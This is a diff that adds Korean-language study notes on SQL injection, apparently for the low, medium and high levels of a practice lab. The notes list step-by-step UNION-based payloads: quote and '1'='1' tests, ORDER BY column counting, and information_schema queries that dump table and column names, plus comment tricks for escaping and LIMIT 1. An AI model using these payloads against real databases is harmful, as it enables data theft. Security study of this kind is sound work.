@@ -1,0 +1,58 @@
+컬럼 수 맞춰서
+
+low
+1. ' 를 넣어 확인
+
+2. or / and '1'='1 로 확인
+
+3. order by @ 로 정렬, 최대 컬럼 수 확인
+
+4. union select database() 로 데이터베이스 이름 확인
+
+5. union select table_name from information_schema.tables where table_schema=database()
+
+6. union select column_name from information_schema.columns where table_name='tablename'
+
+7. union select column from tablename
+
+
+medium
+1. 버프로 넘어가는 값 확인
+
+2. or / and '1'='1 / 1=1 추가
+
+3. order by @ 로 정렬, 최대 컬럼 수 확인
+
+4. union select database() 로 데이터베이스 이름 확인
+
+5. union select table_name from information_schema.tables where table_schema=database()
+
+6. union select column_name from information_schema.columns where table_name='tablename'
+이지만 특수 문자 이스케이프 처리 됨
+union select column_name from information_schema.columns where table_schema=database()
+
+7. union select column from tablename
+
+high
+1. 어떤게 들어가나 확인
+
+2. 따음표 있고/없게 해서 or / and 확인
+
+3. order by @ 로 정렬, 최대 컬럼 수 확인
+
+4. union select database() 로 데이터베이스 이름 확인
+
+5. union select table_name from information_schema.tables where table_schema=database()#
+
+6. union select column_name from information_schema.columns where table_name='tablename
+이러면 코드에 리밋 1이 있어서 하나만 나옴
+union select column_name from information_schema.columns where table_schema=database()#
+
+7. union select column from tablename#
+
+코드 뒤에 리밋 1이 있는데 주석 없이 될까?
+> 난 안된다고 생각됨
+
+
+
+
